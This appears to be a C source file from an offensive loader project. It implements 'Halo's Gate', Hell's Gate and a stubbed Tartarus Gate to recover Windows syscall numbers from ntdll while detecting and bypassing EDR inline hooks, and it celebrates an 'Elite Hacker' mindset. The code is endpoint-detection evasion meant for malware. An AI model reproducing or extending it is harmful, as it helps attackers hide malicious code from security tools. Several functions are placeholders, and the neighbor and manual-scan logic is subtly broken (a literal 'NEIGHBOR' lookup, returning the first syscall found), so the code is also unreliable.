#include "../include/common_defines.h"
#include "../include/halo_gate.h"
#include "../include/rtldr_ctx.h"
#include "../include/utils.h"
#include "../include/mem.h"
#include "../include/syscalls.h"

// ========================================================================
// ELITE HALO'S GATE v2.0 - IMPLEMENTATION
// "If one path is blocked, find seven others" - Elite Hacker Mindset
// ========================================================================

// Common syscall patterns for x64
static const BYTE SYSCALL_PATTERN_STANDARD[] = { 0x4C, 0x8B, 0xD1, 0xB8 };  // mov r10, rcx; mov eax, imm32
static const BYTE SYSCALL_INSTRUCTION[] = { 0x0F, 0x05 };                   // syscall
static const BYTE RET_INSTRUCTION[] = { 0xC3 };                             // ret

// Known hook patterns that EDRs use
static const BYTE JMP_RELATIVE[] = { 0xE9 };                                // jmp rel32
static const BYTE JMP_RAX[] = { 0xFF, 0xE0 };                              // jmp rax
static const BYTE PUSH_RET[] = { 0x68 };                                   // push imm32; ret

// ========================================================================
// CORE INITIALIZATION
// ========================================================================

BOOL HaloGate_Initialize(struct _RTLDR_CTX* ctx, PHALO_GATE_CTX halo_ctx) {
    if (!ctx || !halo_ctx || !ctx->ntdll_base) {
        return FALSE;
    }

    // Zero out context
    for (SIZE_T i = 0; i < sizeof(HALO_GATE_CTX); i++) {
        ((BYTE*)halo_ctx)[i] = 0;
    }

    halo_ctx->ntdll_base = ctx->ntdll_base;
    
    // Get ntdll size from PE headers
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ctx->ntdll_base;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)ctx->ntdll_base + dos_header->e_lfanew);
    halo_ctx->ntdll_size = nt_headers->OptionalHeader.SizeOfImage;

    // Initialize hook patterns
    halo_ctx->hook_patterns.jmp_rel32[0] = 0xE9;
    halo_ctx->hook_patterns.jmp_rax[0] = 0xFF;
    halo_ctx->hook_patterns.jmp_rax[1] = 0xE0;
    halo_ctx->hook_patterns.push_ret[0] = 0x68;

    // Load clean ntdll for comparison (optional - advanced feature)
    // HaloGate_LoadCleanNtdll(halo_ctx);  // Commented out for now

    return TRUE;
}

// ========================================================================
// ADVANCED SYSCALL RESOLUTION ENGINE
// ========================================================================

BOOL HaloGate_ResolveSyscallAdvanced(
    PHALO_GATE_CTX halo_ctx,
    const char* function_name,
    PELITE_SYSCALL_INFO syscall_info
) {
    if (!halo_ctx || !function_name || !syscall_info) {
        return FALSE;
    }

    // Initialize syscall info
    for (SIZE_T i = 0; i < sizeof(ELITE_SYSCALL_INFO); i++) {
        ((BYTE*)syscall_info)[i] = 0;
    }
    syscall_info->syscall_id = INVALID_SYSCALL_ID;

    // METHOD 1: Direct resolution (fastest path)
    if (HaloGate_ResolveDirect(halo_ctx->ntdll_base, function_name, syscall_info)) {
        syscall_info->resolution_method = RESOLVE_METHOD_DIRECT;
        halo_ctx->resolved_count++;
        return TRUE;
    }

    // METHOD 2: Halo's Gate (neighbor analysis)
    if (HaloGate_ResolveViaNeighbors(halo_ctx->ntdll_base, function_name, syscall_info)) {
        syscall_info->resolution_method = RESOLVE_METHOD_HALO_GATE;
        halo_ctx->resolved_count++;
        halo_ctx->hooked_count++;
        return TRUE;
    }

    // METHOD 3: Tartarus Gate (unhook and retry)
    if (TartarusGate_UnhookAndResolve(halo_ctx, function_name, syscall_info)) {
        syscall_info->resolution_method = RESOLVE_METHOD_TARTARUS_GATE;
        halo_ctx->resolved_count++;
        return TRUE;
    }

    // METHOD 4: Hell's Gate (manual scanning)
    if (HellGate_ManualScan(halo_ctx->ntdll_base, function_name, syscall_info)) {
        syscall_info->resolution_method = RESOLVE_METHOD_HELL_GATE;
        halo_ctx->resolved_count++;
        return TRUE;
    }

    // All methods failed
    syscall_info->resolution_method = RESOLVE_METHOD_FAILED;
    halo_ctx->failed_count++;
    return FALSE;
}

// ========================================================================
// METHOD 1: DIRECT RESOLUTION
// ========================================================================

BOOL HaloGate_ResolveDirect(
    PVOID ntdll_base,
    const char* function_name,
    PELITE_SYSCALL_INFO syscall_info
) {
    PVOID function_addr = find_function(ntdll_base, function_name);
    if (!function_addr) {
        return FALSE;
    }

    syscall_info->function_address = function_addr;
    BYTE* bytes = (BYTE*)function_addr;

    // Copy current bytes for analysis
    for (int i = 0; i < 32; i++) {
        syscall_info->current_bytes[i] = bytes[i];
    }

    // Check for hook patterns first
    if (HaloGate_IsHooked(function_addr, NULL)) {
        syscall_info->is_hooked = TRUE;
        return FALSE;  // Function is hooked, try other methods
    }

    // Look for standard syscall pattern
    for (int i = 0; i < 32; i++) {
        // Pattern: mov r10, rcx; mov eax, imm32; syscall; ret
        if (bytes[i] == 0x4C && bytes[i+1] == 0x8B && bytes[i+2] == 0xD1 && bytes[i+3] == 0xB8) {
            // Verify syscall instruction follows
            if (i + 8 < 32 && bytes[i+8] == 0x0F && bytes[i+9] == 0x05) {
                syscall_info->syscall_id = *(DWORD*)(bytes + i + 4);
                syscall_info->is_valid = TRUE;
                return TRUE;
            }
        }
    }

    return FALSE;
}

// ========================================================================
// METHOD 2: HALO'S GATE (NEIGHBOR ANALYSIS)
// ========================================================================

BOOL HaloGate_ResolveViaNeighbors(
    PVOID ntdll_base,
    const char* function_name,
    PELITE_SYSCALL_INFO syscall_info
) {
    // Get function ordinal for neighbor calculation
    INT target_ordinal = HaloGate_GetFunctionOrdinal(ntdll_base, function_name);
    if (target_ordinal == -1) {
        return FALSE;
    }

    // Try neighbors (both directions)
    for (int offset = 1; offset <= 5; offset++) {
        // Try function below (offset positive)
        PVOID neighbor_down = HaloGate_GetNeighborFunction(ntdll_base, function_name, offset);
        if (neighbor_down) {
            ELITE_SYSCALL_INFO neighbor_info = {0};
            if (HaloGate_ResolveDirect(ntdll_base, "NEIGHBOR", &neighbor_info)) {
                // Calculate target syscall ID
                DWORD target_id = HaloGate_CalculateSyscallFromNeighbor(neighbor_info.syscall_id, -offset);
                if (target_id != INVALID_SYSCALL_ID) {
                    syscall_info->syscall_id = target_id;
                    syscall_info->is_valid = TRUE;
                    syscall_info->is_hooked = TRUE;
                    return TRUE;
                }
            }
        }

        // Try function above (offset negative)
        PVOID neighbor_up = HaloGate_GetNeighborFunction(ntdll_base, function_name, -offset);
        if (neighbor_up) {
            ELITE_SYSCALL_INFO neighbor_info = {0};
            if (HaloGate_ResolveDirect(ntdll_base, "NEIGHBOR", &neighbor_info)) {
                DWORD target_id = HaloGate_CalculateSyscallFromNeighbor(neighbor_info.syscall_id, offset);
                if (target_id != INVALID_SYSCALL_ID) {
                    syscall_info->syscall_id = target_id;
                    syscall_info->is_valid = TRUE;
                    syscall_info->is_hooked = TRUE;
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

// ========================================================================
// METHOD 3: TARTARUS GATE (UNHOOK AND RETRY)
// ========================================================================

BOOL TartarusGate_UnhookAndResolve(
    PHALO_GATE_CTX halo_ctx,
    const char* function_name,
    PELITE_SYSCALL_INFO syscall_info
) {
    // For now, return FALSE - full unhooking implementation would go here
    // This would involve loading clean ntdll and copying original bytes
    return FALSE;
}

// ========================================================================
// METHOD 4: HELL'S GATE (MANUAL SCANNING)
// ========================================================================

BOOL HellGate_ManualScan(
    PVOID ntdll_base,
    const char* function_name,
    PELITE_SYSCALL_INFO syscall_info
) {
    // Manual .text section scanning as last resort
    // This is a simplified implementation
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_base + dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt_headers);

    // Find .text section
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (sections[i].Name[0] == '.' && sections[i].Name[1] == 't' && sections[i].Name[2] == 'e' && 
            sections[i].Name[3] == 'x' && sections[i].Name[4] == 't') {
            
            BYTE* text_start = (BYTE*)ntdll_base + sections[i].VirtualAddress;
            SIZE_T text_size = sections[i].Misc.VirtualSize;

            // Scan for syscall patterns
            for (SIZE_T j = 0; j < text_size - 12; j++) {
                if (text_start[j] == 0x4C && text_start[j+1] == 0x8B && text_start[j+2] == 0xD1 && text_start[j+3] == 0xB8) {
                    if (text_start[j+8] == 0x0F && text_start[j+9] == 0x05) {
                        // Found potential syscall - this is simplified, real implementation would
                        // need to correlate with function names via export table
                        DWORD found_id = *(DWORD*)(text_start + j + 4);
                        // For demo, just return the first one found
                        syscall_info->syscall_id = found_id;
                        syscall_info->is_valid = TRUE;
                        return TRUE;
                    }
                }
            }
            break;
        }
    }

    return FALSE;
}

// ========================================================================
// HOOK DETECTION UTILITIES
// ========================================================================

BOOL HaloGate_IsHooked(PVOID function_address, PBYTE original_bytes) {
    BYTE* bytes = (BYTE*)function_address;

    // Check for common hook patterns
    
    // Pattern 1: JMP relative (E9 XX XX XX XX)
    if (bytes[0] == 0xE9) {
        return TRUE;
    }

    // Pattern 2: JMP RAX (FF E0)
    if (bytes[0] == 0xFF && bytes[1] == 0xE0) {
        return TRUE;
    }

    // Pattern 3: PUSH + RET (68 XX XX XX XX C3)
    if (bytes[0] == 0x68 && bytes[5] == 0xC3) {
        return TRUE;
    }

    // Pattern 4: MOV RAX + JMP RAX (48 B8 XX XX XX XX XX XX XX XX FF E0)
    if (bytes[0] == 0x48 && bytes[1] == 0xB8 && bytes[10] == 0xFF && bytes[11] == 0xE0) {
        return TRUE;
    }

    // Not hooked (or using unknown hook method)
    return FALSE;
}

// ========================================================================
// HELPER FUNCTIONS (SIMPLIFIED IMPLEMENTATIONS)
// ========================================================================

PVOID HaloGate_GetNeighborFunction(PVOID ntdll_base, const char* target_function, INT offset) {
    // Simplified implementation - real version would walk export table
    return NULL;  // Placeholder
}

DWORD HaloGate_CalculateSyscallFromNeighbor(DWORD neighbor_id, INT function_offset) {
    // Syscall IDs are typically sequential
    return neighbor_id + function_offset;
}

INT HaloGate_GetFunctionOrdinal(PVOID ntdll_base, const char* function_name) {
    // Simplified - real implementation would parse export table
    return -1;  // Placeholder
}

VOID HaloGate_Cleanup(PHALO_GATE_CTX halo_ctx) {
    if (!halo_ctx) return;
    
    // Cleanup resources
    if (halo_ctx->ntdll_clean_copy) {
        // Free clean copy if allocated
        // free_memory(halo_ctx->ntdll_clean_copy, 0, MEM_RELEASE);
        halo_ctx->ntdll_clean_copy = NULL;
    }
} 